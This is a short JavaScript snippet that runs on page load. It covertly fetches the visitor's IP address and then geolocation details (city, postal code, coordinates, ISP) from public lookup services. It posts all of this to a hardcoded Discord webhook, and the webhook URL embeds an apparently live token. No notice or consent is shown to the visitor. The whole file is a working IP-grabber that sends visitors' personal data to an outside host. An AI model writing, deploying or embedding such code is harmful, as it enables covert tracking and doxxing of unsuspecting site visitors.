function sendToDiscord(message) {
    // Your Discord API endpoint
    const discordApiEndpoint = 'https://discord.com/api/webhooks/1231387717686792322/ItTuXtWgCfrDdCPVaztnHEgTNbIA9tkqt1eT-MYJV50BNl5SfXjDcq4PpW1IfgTJp7vA';

    // Construct the request body
    const requestBody = {
        content: message
    };

    // Make a POST request to your Discord API endpoint
    fetch(discordApiEndpoint, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestBody)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to send message to Discord');
        }
        console.log('Message sent to Discord successfully');
    })
    .catch(error => {
        console.error('Error sending message to Discord:', error);
    });
}

function getSystemInfo() {
    // Get IP address information
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            fetch(`https://ipapi.co/${data.ip}/json/`)
                .then(response => response.json())
                .then(ipData => {
                    const ip = data.ip;

                    // Construct message
                    const message = `
                        IP Address: ${ip}<br>
                        Country: ${ipData.country_name}<br>
                        Region: ${ipData.region}<br>
                        Country Code: ${ipData.country_code}<br>
                        Continent Code: ${ipData.continent_code}<br>
                        City: ${ipData.city}<br>
                        ZIP/Postal Code: ${ipData.postal}<br>
                        Latitude: ${ipData.latitude}<br>
                        Longitude: ${ipData.longitude}<br>
                        Timezone: ${ipData.timezone}<br>
                        ISP: ${ipData.org}<br>
                    `;

                    // Send message to Discord
                    sendToDiscord(message);
                })
                .catch(error => {
                    
                });
        })
        .catch(error => {
            console.error("Error fetching IP address:", error);
        });
}

// Call getSystemInfo() when the page loads
window.addEventListener('load', getSystemInfo);